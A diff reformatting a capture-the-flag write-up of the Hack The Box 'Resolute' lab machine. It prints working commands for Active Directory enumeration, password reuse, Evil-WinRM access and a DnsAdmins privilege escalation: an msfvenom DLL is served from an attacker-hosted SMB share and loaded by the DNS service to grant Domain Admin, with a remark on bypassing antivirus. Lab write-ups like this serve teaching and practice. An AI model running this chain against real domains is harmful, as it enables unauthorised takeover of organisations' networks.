@@ -1,7 +1,10 @@
-Write-up
+# HTB - Resolute - Write-up
 
-First, as always...the nmap scan. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` runs a TCP connect scan, `-sV` does a service scan, `-oA <name>` saves all types of output (`.nmap`,`.gnmap`, and `.xml`)  with filenames of `<name>`.
-```
+First, as always...the nmap scan. 
+
+The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` runs a TCP connect scan, `-sV` does a service scan, `-oA <name>` saves all types of output \(`.nmap`,`.gnmap`, and `.xml`\) with filenames of `<name>`.
+
+```text
 zweilos@kalimaa:~/htb/resolute$ nmap -sC -sV -oA resolute 10.10.10.169
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-23 08:21 EDT
@@ -55,10 +58,12 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 185.35 seconds
 ```
-From these results we can see there are a lot of ports open!  Since ports `88 - kerberos`, `135 & 139 - Remote Procedure Call`, `389 - LDAP`, and `445 - SMB` are all open it is safe to assume that this box is running Active Directory on a Windows machine.  The host script also validates this by reporting to us that this is running `Windows Server 2016 Standard 14393`.  
 
-Since I had so many options, I decided to start by enumerating Active Directory through LDAP using `ldapsearch`.  This command is built into many linux distros and returned a wealth of information.  I snipped out huge chunks of the output in order to reduce information overload as most of it was not particularly interesting in this case.
-```
+From these results we can see there are a lot of ports open! Since ports `88 - kerberos`, `135 & 139 - Remote Procedure Call`, `389 - LDAP`, and `445 - SMB` are all open it is safe to assume that this box is running Active Directory on a Windows machine. The host script also validates this by reporting to us that this is running `Windows Server 2016 Standard 14393`.
+
+Since I had so many options, I decided to start by enumerating Active Directory through LDAP using `ldapsearch`. This command is built into many linux distros and returned a wealth of information. I snipped out huge chunks of the output in order to reduce information overload as most of it was not particularly interesting in this case.
+
+```text
 zweilos@kalimaa:~/htb/resolute$ ldapsearch -H ldap://10.10.10.169:3268 -x -LLL -s sub -b "DC=megabank,DC=local"
 
 dn: DC=megabank,DC=local
@@ -75,141 +80,10 @@ subRefs: CN=Configuration,DC=megabank,DC=local
 uSNCreated: 4099
 uSNChanged: 147500
 name: megabank
-objectGUID:: RungtOfLt0KPoFxM7C/lqg==
-replUpToDateVector:: AgAAAAAAAAAVAAAAAAAAADv+xw5NT59AgbZ+xJHTUowawAEAAAAAAAxz9
- xMDAAAAwh0pHcgb2UeivFJL4Q8QZAigAAAAAAAAETWfEwMAAABwEWNEnJ/JTqZrXDzeu6t8HOABAA
- AAAABGe/cTAwAAAKo4iGFkQ2tNttYznkdNa8gHkAAAAAAAAFownxMDAAAABaKyYvsphkGwNf2+l/T
- OcQmwAAAAAAAA0DefEwMAAABgnQ5ls1S9RbRniAcF/EnhBXAAAAAAAAA8IJ8TAwAAANkKY2p5o8JJ
- iWThb22GsFkfEAIAAAAAAPEu+BMDAAAANjjJgh690k6SHEyv8j3GbwzgAAAAAAAAQB/mEwMAAAARO
- oWDI5jaSqqD5vcle3fBGKABAAAAAAAKafcTAwAAANC7S4v1tdVEvvnXks56Pzsb0AEAAAAAAHZ39x
- MDAAAAClc6jW+1nEe6iH9KjbQfHxVwAQAAAAAALiT3EwMAAADYJfudVPvpSK11CCwhkf7sBoAAAAA
- AAADpLJ8TAwAAACXlzaE+3D1MqNP2Y3JBf0UiQAIAAAAAAPm92RQDAAAAI0kCuedEgkuD1X4NGZry
- vANQAAAAAAAAEQifEwMAAABooZzLa39qTIhGDRTmkPLbDfAAAAAAAAA67/YTAwAAAGQiEtJziTtNr
- YUBSO25WFYd8AEAAAAAAAl99xMDAAAApE8+2ZurlkOpfSCKxJW1hiEwAgAAAAAAKlP4EwMAAAAioK
- HkPq1oSIGNZVqBCYLmBGAAAAAAAABdFJ8TAwAAALuMxOadAYNJgTaOC1xgILUZsAEAAAAAAA1u9xM
- DAAAAJX069+D2702y4t2ALvAqsxeQAQAAAAAAu2D3EwMAAAD5MMD/nWa2S5M5V1KBxVCmHgACAAAA
- AAAHHfgTAwAAAA==
-objectSid:: AQQAAAAAAAUVAAAAaeAGU04VmrOsCGHW
-wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=mega
- bank,DC=local
-wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra
- m Data,DC=megabank,DC=local
-wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=meg
- abank,DC=local
-wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin
- cipals,DC=megabank,DC=local
-wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=
- megabank,DC=local
-wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=m
- egabank,DC=local
-wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=meg
- abank,DC=local
-wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=megabank,
- DC=local
-wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,
- DC=megabank,DC=local
-wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=megaba
- nk,DC=local
-wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=megabank,D
- C=local
-objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=megabank,DC=local
-gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=Syste
- m,DC=megabank,DC=local;0]
-dSCorePropagationData: 16010101000000.0Z
-masteredBy: CN=NTDS Settings,CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name
- ,CN=Sites,CN=Configuration,DC=megabank,DC=local
-msDs-masteredBy: CN=NTDS Settings,CN=RESOLUTE,CN=Servers,CN=Default-First-Site
- -Name,CN=Sites,CN=Configuration,DC=megabank,DC=local
-msDS-IsDomainFor: CN=NTDS Settings,CN=RESOLUTE,CN=Servers,CN=Default-First-Sit
- e-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local
-dc: megabank
 
-dn: CN=Configuration,DC=megabank,DC=local
 
-dn: CN=Users,DC=megabank,DC=local
-objectClass: top
-objectClass: container
-cn: Users
-description: Default container for upgraded user accounts
-distinguishedName: CN=Users,DC=megabank,DC=local
-instanceType: 4
-whenCreated: 20190925132831.0Z
-whenChanged: 20190925132831.0Z
-uSNCreated: 5888
-uSNChanged: 5888
-name: Users
-objectGUID:: KtUO0OCAmEGB1jACzfq3zw==
-objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=megabank,DC=local
-dSCorePropagationData: 20190927221048.0Z
-dSCorePropagationData: 20190927105219.0Z
-dSCorePropagationData: 20190926123501.0Z
-dSCorePropagationData: 20190925132912.0Z
-dSCorePropagationData: 16010714042433.0Z
-
-dn: CN=Computers,DC=megabank,DC=local
-objectClass: top
-objectClass: container
-cn: Computers
-description: Default container for upgraded computer accounts
-distinguishedName: CN=Computers,DC=megabank,DC=local
-instanceType: 4
-whenCreated: 20190925132831.0Z
-whenChanged: 20190925132831.0Z
-uSNCreated: 5889
-uSNChanged: 5889
-name: Computers
-objectGUID:: /8XiQRUSvkWcoUiDWK1YCA==
-objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=megabank,DC=local
-dSCorePropagationData: 20190927221048.0Z
-dSCorePropagationData: 20190927105218.0Z
-dSCorePropagationData: 20190926123501.0Z
-dSCorePropagationData: 20190925132912.0Z
-dSCorePropagationData: 16010714042433.0Z
-
-dn: OU=Domain Controllers,DC=megabank,DC=local
-objectClass: top
-objectClass: organizationalUnit
-ou: Domain Controllers
-description: Default container for domain controllers
-distinguishedName: OU=Domain Controllers,DC=megabank,DC=local
-instanceType: 4
-whenCreated: 20190925132831.0Z
-whenChanged: 20190925132831.0Z
-uSNCreated: 6031
-uSNChanged: 6031
-name: Domain Controllers
-objectGUID:: 0msxEif+OkGQ0Ecbb150lw==
-objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=megabank,
- DC=local
-gPLink: [LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=Syste
- m,DC=megabank,DC=local;0]
-dSCorePropagationData: 20190927221048.0Z
-dSCorePropagationData: 20190927105218.0Z
-dSCorePropagationData: 20190926123501.0Z
-dSCorePropagationData: 20190925132912.0Z
-dSCorePropagationData: 16010714042433.0Z
-
-dn: CN=System,DC=megabank,DC=local
-objectClass: top
-objectClass: container
-cn: System
-description: Builtin system settings
-distinguishedName: CN=System,DC=megabank,DC=local
-instanceType: 4
-whenCreated: 20190925132831.0Z
-whenChanged: 20190925132831.0Z
-uSNCreated: 5890
-uSNChanged: 5890
-name: System
-objectGUID:: H9L5QEkO9U+/MQrYP7xFBA==
-objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=megabank,DC=local
-dSCorePropagationData: 20190927221048.0Z
-dSCorePropagationData: 20190927105218.0Z
-dSCorePropagationData: 20190926123501.0Z
-dSCorePropagationData: 20190925132912.0Z
-dSCorePropagationData: 16010714042433.0Z
-
-...snipped for brevity. Nothing surprising or useful so far. The guest account is potentially open, though...
+...snipped for brevity. Nothing surprising or useful so far. 
+The guest account is potentially open, though...
 
 dn: CN=Administrator,CN=Users,DC=megabank,DC=local
 
@@ -240,10 +114,13 @@ dSCorePropagationData: 20190927105219.0Z
 dSCorePropagationData: 20190925132912.0Z
 dSCorePropagationData: 16010101181633.0Z
 
-...snipped for brevity.  There are lots of built-in groups in Active Directory.  None had any members in this case.
+...snipped for brevity.  There are lots of built-in groups in Active Directory.  
+None had any members in this case.
 ```
-The `Remote Management Users` group contains the user named `Melanie Purkis` and the group `Contractors`.  We should keep an eye out for more information about those, as Windows Remote Management is an easy way to access a shell on a Windows machine remotely.
-```
+
+The `Remote Management Users` group contains the user named `Melanie Purkis` and the group `Contractors`. We should keep an eye out for more information about those, as Windows Remote Management is an easy way to access a shell on a Windows machine remotely.
+
+```text
 dn: CN=Remote Management Users,CN=Builtin,DC=megabank,DC=local
 objectClass: top
 objectClass: group
@@ -274,8 +151,9 @@ dSCorePropagationData: 16010101181217.0Z
 ...snipped some more for brevity...
 ```
 
-This host named `RESOLUTE` looks important.  It contains the DNS server, Kerberos server, and is running LDAP and RPC.  It is also in the `Domain Controllers` OU!  Looks like a good target.
-```
+This host named `RESOLUTE` looks important. It contains the DNS server, Kerberos server, and is running LDAP and RPC. It is also in the `Domain Controllers` OU! Looks like a good target.
+
+```text
 dn: CN=RESOLUTE,OU=Domain Controllers,DC=megabank,DC=local
 objectClass: top
 objectClass: person
@@ -335,31 +213,11 @@ lastLogonTimestamp: 132347161950202079
 msDFSR-ComputerReferenceBL: CN=DC,CN=Topology,CN=Domain System Volume,CN=DFSR-
  GlobalSettings,CN=System,DC=megabank,DC=local
 ```
-```
+
+```text
 dn: CN=krbtgt,CN=Users,DC=megabank,DC=local
 
 dn: CN=Domain Computers,CN=Users,DC=megabank,DC=local
-objectClass: top
-objectClass: group
-cn: Domain Computers
-description: All workstations and servers joined to the domain
-distinguishedName: CN=Domain Computers,CN=Users,DC=megabank,DC=local
-instanceType: 4
-whenCreated: 20190925132912.0Z
-whenChanged: 20190925132912.0Z
-uSNCreated: 12330
-uSNChanged: 12332
-name: Domain Computers
-objectGUID:: OMjXRDuSdUqo8LRbrxuq2A==
-objectSid:: AQUAAAAAAAUVAAAAaeAGU04VmrOsCGHWAwIAAA==
-sAMAccountName: Domain Computers
-sAMAccountType: 268435456
-groupType: -2147483646
-objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
-dSCorePropagationData: 20190927221048.0Z
-dSCorePropagationData: 20190927105219.0Z
-dSCorePropagationData: 20190925132912.0Z
-dSCorePropagationData: 16010101181633.0Z
 
 dn: CN=Domain Controllers,CN=Users,DC=megabank,DC=local
 
@@ -381,8 +239,10 @@ dn: CN=Account Operators,CN=Builtin,DC=megabank,DC=local
 
 ...snipped for brevity...
 ```
-The `DnsAdmins` group contains the `Contractors` group.  If there are any members of the `Contractors` group they have the permissions for administration of the DNS servers.
-```
+
+The `DnsAdmins` group contains the `Contractors` group. If there are any members of the `Contractors` group they have the permissions for administration of the DNS servers.
+
+```text
 dn: CN=DnsAdmins,CN=Users,DC=megabank,DC=local
 objectClass: top
 objectClass: group
@@ -408,8 +268,10 @@ dSCorePropagationData: 16010101000417.0Z
 
 ...snipped for brevity...
 ```
-So there is a SYSVOL share.  We should try to connect to it and see if we can retrieve any useful information.
-```
+
+So there is a SYSVOL share. We should try to connect to it and see if we can retrieve any useful information.
+
+```text
 dn: CN=SYSVOL Share,CN=Content,CN=Domain System Volume,CN=DFSR-GlobalSettings,
  CN=System,DC=megabank,DC=local
 objectClass: top
@@ -430,8 +292,10 @@ dSCorePropagationData: 20190927221048.0Z
 dSCorePropagationData: 20190927105219.0Z
 dSCorePropagationData: 16010101000417.0Z
 ```
-The `Contractors` group is a member of both the `DnsAdmins` and `Remote Management Users` groups.  If there are any users in this group we should target them.
-```
+
+The `Contractors` group is a member of both the `DnsAdmins` and `Remote Management Users` groups. If there are any users in this group we should target them.
+
+```text
 dn: CN=Contractors,OU=Groups,DC=megabank,DC=local
 objectClass: top
 objectClass: group
@@ -458,8 +322,10 @@ dSCorePropagationData: 20190927221048.0Z
 dSCorePropagationData: 20190927105218.0Z
 dSCorePropagationData: 16010101000417.0Z
 ```
+
 A potential hostname for a Kerberos server? `MS02.megabank.local`
-```
+
+```text
 dn: CN=MS02,CN=Computers,DC=megabank,DC=local
 objectClass: top
 objectClass: person
@@ -549,8 +415,10 @@ dSCorePropagationData: 20190927221048.0Z
 dSCorePropagationData: 20190927105423.0Z
 dSCorePropagationData: 16010101000001.0Z
 ```
-The user `ryan` is a member of the `Contractors` group.  This may be very useful.
-```
+
+The user `ryan` is a member of the `Contractors` group. This may be very useful.
+
+```text
 dn: CN=Ryan Bertrand,OU=Contractors,OU=MegaBank Users,DC=megabank,DC=local
 objectClass: top
 objectClass: person
@@ -582,8 +450,10 @@ dSCorePropagationData: 20190927105650.0Z
 dSCorePropagationData: 16010101000001.0Z
 lastLogonTimestamp: 132347162245358799
 ```
+
 The next user had some interesting information in the `description` field:
-```ldap
+
+```text
 dn: CN=Marko Novak,OU=Employees,OU=MegaBank Users,DC=megabank,DC=local
 objectClass: top
 objectClass: person
@@ -614,8 +484,10 @@ dSCorePropagationData: 20190927221048.0Z
 dSCorePropagationData: 20190927131714.0Z
 dSCorePropagationData: 16010101000001.0Z
 ```
-So it seems we have a potential username and password! `marko:Welcome123!`. 
-```ldap
+
+So it seems we have a potential username and password! `marko:Welcome123!`.
+
+```text
 dn: CN=Sunita Rahman,CN=Users,DC=megabank,DC=local
 objectClass: top
 objectClass: person
@@ -1007,7 +879,8 @@ userPrincipalName: claude@megabank.local
 objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
 dSCorePropagationData: 16010101000000.0Z
 ```
-```
+
+```text
 dn: CN=Melanie Purkis,CN=Users,DC=megabank,DC=local
 objectClass: top
 objectClass: person
@@ -1033,8 +906,10 @@ objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
 dSCorePropagationData: 16010101000000.0Z
 lastLogonTimestamp: 132347185209935050
 ```
-Hmmm...the user `melanie` is a member of the `Remote Management Users` group.  This looks like another good target for gaining access.
-```
+
+Hmmm...the user `melanie` is a member of the `Remote Management Users` group. This looks like another good target for gaining access.
+
+```text
 dn: CN=Zach Armstrong,CN=Users,DC=megabank,DC=local
 objectClass: top
 objectClass: person
@@ -1104,13 +979,16 @@ userPrincipalName: naoki@megabank.local
 objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
 dSCorePropagationData: 16010101000000.0Z
 ```
-There was no interesting information in the other users, but I made a list of their usernames, just in case.  So far the interesting users were: 
-- marko: has a potential password in his description field `Welcome123!`.
-- melanie: a member of the `Remote Management Users` group.
-- ryan: a member of the `Contractors` group, which is also a member of both the `Remote Management Users` and the `DnsAdmins` group.
- 
-Next I used `rpcclient` to validate the information I found through LDAP using the `enumdomusers` and `queryuser <rid>` RPC commands. 
-```
+
+There was no interesting information in the other users, but I made a list of their usernames, just in case. So far the interesting users were:
+
+* marko: has a potential password in his description field `Welcome123!`.
+* melanie: a member of the `Remote Management Users` group.
+* ryan: a member of the `Contractors` group, which is also a member of both the `Remote Management Users` and the `DnsAdmins` group.
+
+Next I used `rpcclient` to validate the information I found through LDAP using the `enumdomusers` and `queryuser <rid>` RPC commands.
+
+```text
 zweilos@kalimaa:~/htb/resolute$ rpcclient -U "" -N 10.10.10.169
 
 rpcclient $> enumdomusers
@@ -1172,9 +1050,10 @@ rpcclient $> queryuser 0x457
         padding1[0..7]...
         logon_hrs[0..21]...
 ```
-Hmm...so the user `marko` has no home drive or profile path, and has never logged on.  Maybe the user was only created on the domain but has no local account?  I tried using his creds to enumerate SMB but got nothing back.  I then tested his password with the users `ryan` and `melanie` and was able to get a share listing with `melanie:Welcome123!`! Thank you password reuse!  
 
-```
+Hmm...so the user `marko` has no home drive or profile path, and has never logged on. Maybe the user was only created on the domain but has no local account? I tried using his creds to enumerate SMB but got nothing back. I then tested his password with the users `ryan` and `melanie` and was able to get a share listing with `melanie:Welcome123!`! Thank you password reuse!
+
+```text
 zweilos@kalimaa:~/htb/resolute$ smbclient -U melanie -L //10.10.10.169/
 Enter WORKGROUP\melanie's password: 
 
@@ -1187,9 +1066,10 @@ Enter WORKGROUP\melanie's password:
         SYSVOL          Disk      Logon server share 
 SMB1 disabled -- no workgroup available
 ```
-Next, I tried connecting to each of the shares.  We only see the standard Windows domain shares, nothing out of the ordinary.  Only `NETLOGON` and `SYSVOL` allowed `melanie` to log in, but neither contained anything useful.  `SYSVOL` had more folders to browse through, but still nothing useful.
 
-```
+Next, I tried connecting to each of the shares. We only see the standard Windows domain shares, nothing out of the ordinary. Only `NETLOGON` and `SYSVOL` allowed `melanie` to log in, but neither contained anything useful. `SYSVOL` had more folders to browse through, but still nothing useful.
+
+```text
 zweilos@kalimaa:~/htb/resolute$ smbclient -U melanie //10.10.10.169/NETLOGON Welcome123!
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -1198,17 +1078,20 @@ smb: \> ls
 
                 10340607 blocks of size 4096. 7555454 blocks available
 ```
+
 Since `melanie` is a member of the `Remote Management Users` group, I tried to log in through Windows Remote Management using the `Evil-WinRM` tool, which can be found at [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm).
 
-```
+```text
 zweilos@kalimaa:~/htb/resolute$ evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!'
 
 Evil-WinRM shell v2.3
 
 Info: Establishing connection to remote endpoint
 ```
+
 I'm in!
-```powershell
+
+```text
 *Evil-WinRM* PS C:\Users\melanie\Documents> whoami /all
 
 USER INFORMATION
@@ -1255,11 +1138,12 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 *Evil-WinRM* PS C:\Users\melanie\Desktop> cat user.txt
 fc92144f24a8510dd36ac3aa890611ee
 ```
-`whoami /all` didn't reveal any information that we didn't already know, so we will have to continue searching for useful things.  I did find the user flag on `melanie`'s `\Desktop` though!
 
-Since we noticed the user `ryan` earlier had access to the `DnsAdmin` group, I figured that it would be good to search for any files with his name in it.  Since we are in a Powershell environment, `Get-ChildItem` is the command we want.  `ls` is a common alias to that command which is why the below command works. `-R` Makes the search recursive, `-Hidden` includes hidden files in the search, `-EA SilentlyContinue` is shorthand for `-ErrorAction Silently Continue` and specifies that we do not want to see any errors that result (such as files or directories that we don't have access to).  `Select-String` is similar to the Linux `grep` command.  
+`whoami /all` didn't reveal any information that we didn't already know, so we will have to continue searching for useful things. I did find the user flag on `melanie`'s `\Desktop` though!
 
-```powershell
+Since we noticed the user `ryan` earlier had access to the `DnsAdmin` group, I figured that it would be good to search for any files with his name in it. Since we are in a Powershell environment, `Get-ChildItem` is the command we want. `ls` is a common alias to that command which is why the below command works. `-R` Makes the search recursive, `-Hidden` includes hidden files in the search, `-EA SilentlyContinue` is shorthand for `-ErrorAction Silently Continue` and specifies that we do not want to see any errors that result \(such as files or directories that we don't have access to\). `Select-String` is similar to the Linux `grep` command.
+
+```text
 *Evil-WinRM* PS C:\> ls -R -Hidden -EA SilentlyContinue | select-string ryan
 
 PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:4:Username: MEGABANK\ryan
@@ -1284,7 +1168,8 @@ Evil-WinRM shell v2.3
 
 Info: Establishing connection to remote endpoint
 ```
-```powershell
+
+```text
 *Evil-WinRM* PS C:\Users\ryan\Documents> whoami /all
 
 USER INFORMATION
@@ -1331,18 +1216,21 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 *Evil-WinRM* PS C:\Users\ryan\Documents>
 ```
+
 Next I did a little research to see if the `DnsAdmins` group had any known privilege escalation routes, and found this interesting article describing how to escalate privileges by doing dll injection: [https://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/](https://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/). The author lists the steps to acomplish this as:
 
-    1.Making a dll payload that sends a reverse shell back to our machine with msfvenom.
-    2.Serving it using SMB Server to make it available to the Windows machine.
-    3.Importing that dll in the DNS Server.
-    4.Restarting the DNS Server so that it loads the dll file.
-
-In my case, I was not able to get the dll injection to provide a reverse shell, so I came up with another route.  I did use `msfvenom` to craft my dll to inject, but since the reverse shell payload failed, I decided to simply promote my current user account to `Domain Admin`.
-
-Since we need to run a command to grant our user `Domain Admin` privileges we need to use the `windows/x64/exec` module.  *(Making sure to choose the right architecture.  This machine is x64.)*  The command `net group "domain admins" ryan /add /domain` will add the user `ryan` to the `domain admins` group.  
-
+```text
+1.Making a dll payload that sends a reverse shell back to our machine with msfvenom.
+2.Serving it using SMB Server to make it available to the Windows machine.
+3.Importing that dll in the DNS Server.
+4.Restarting the DNS Server so that it loads the dll file.
 ```
+
+In my case, I was not able to get the dll injection to provide a reverse shell, so I came up with another route. I did use `msfvenom` to craft my dll to inject, but since the reverse shell payload failed, I decided to simply promote my current user account to `Domain Admin`.
+
+Since we need to run a command to grant our user `Domain Admin` privileges we need to use the `windows/x64/exec` module. _\(Making sure to choose the right architecture. This machine is x64.\)_ The command `net group "domain admins" ryan /add /domain` will add the user `ryan` to the `domain admins` group.
+
+```text
 zweilos@kalimaa:~/htb/resolute$ msfvenom -p windows/x64/exec cmd='net group "domain admins" ryan /add /domain' --platform windows -f dll > ~/dns.dll
 
 [-] No arch selected, selecting arch: x64 from the payload
@@ -1350,26 +1238,31 @@ No encoder or badchars specified, outputting raw payload
 Payload size: 311 bytes
 Final size of dll file: 5120 bytes
 ```
-I then hosted my dll on an SMB share so I could access it from the Windows machine without transferring it fand storing it on the remote disk.  This is useful for loading executables directly into memory to bypass AV. The Impacket python module library has an example smbserver that is ready-made to this. I created a share named `SHARE` from my local user's home directory with
-`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -debug SHARE ~/`
 
-After logging back in as `ryan` with `Evil-WinRM`, 
-```
+I then hosted my dll on an SMB share so I could access it from the Windows machine without transferring it fand storing it on the remote disk. This is useful for loading executables directly into memory to bypass AV. The Impacket python module library has an example smbserver that is ready-made to this. I created a share named `SHARE` from my local user's home directory with `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -debug SHARE ~/`
+
+After logging back in as `ryan` with `Evil-WinRM`,
+
+```text
 zweilos@kalimaa:~/htb/resolute$ evil-winrm -u ryan -p 'Serv3r4Admin4cc123!' -i 10.10.10.169
 
 Evil-WinRM shell v2.3
 
 Info: Establishing connection to remote endpoint
 ```
+
 I used the `dnscmd.exe` program to interact with the DNS service and telling it to load my crafted dll from the remote share.
-```
+
+```text
 *Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd.exe RESOLUTE /config /serverlevelplugindll \\10.10.14.253\SHARE\dns.dll
 
 Registry property serverlevelplugindll successfully reset.
 Command completed successfully.
 ```
-According to the article, you next have to stop and restart the DNS service.  You can do this using `sc.exe`.  *(Don't just type `sc` as this is an alias for `Set-Content` in Powershell and will not work.)*
-```
+
+According to the article, you next have to stop and restart the DNS service. You can do this using `sc.exe`. _\(Don't just type `sc` as this is an alias for `Set-Content` in Powershell and will not work.\)_
+
+```text
 *Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns
 
 SERVICE_NAME: dns
@@ -1393,8 +1286,10 @@ SERVICE_NAME: dns
         PID                : 1008
         FLAGS              :
 ```
-Back at my SMB server, you can see the incoming connection from the `RESOLUTE` machine.  The dll was only retrieved when the DNS service was restarted, so don't worry if you didn't see the request for the file when you ran the earlier command.
-```
+
+Back at my SMB server, you can see the incoming connection from the `RESOLUTE` machine. The dll was only retrieved when the DNS service was restarted, so don't worry if you didn't see the request for the file when you ran the earlier command.
+
+```text
 zweilos@kalimaa:/usr/bin$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -debug SHARE ~/
 Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation
 
@@ -1413,8 +1308,10 @@ Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corpo
 [*] Closing down connection (10.10.10.169,52825)
 [*] Remaining connections []
 ```
+
 In order for the new permissions to take effect you have to log out of the user and log back in.
-```
+
+```text
 *Evil-WinRM* PS C:\Users\ryan\Documents> exit
 
 Info: Exiting with code 0
@@ -1425,7 +1322,8 @@ Evil-WinRM shell v2.3
 
 Info: Establishing connection to remote endpoint
 ```
-```
+
+```text
 *Evil-WinRM* PS C:\Users\ryan\Documents> whoami /all
 
 USER INFORMATION
@@ -1500,4 +1398,5 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 ebdd1e01af7b2f1a53a1ef844a5d465c
 ```
 
-Thanks to [`egre55`](https://www.hackthebox.eu/home/users/profile/1190) for a fun and easy Windows box.  I learned some new things while going though this one.
+Thanks to [`egre55`](https://www.hackthebox.eu/home/users/profile/1190) for a fun and easy Windows box. I learned some new things while going though this one.
+
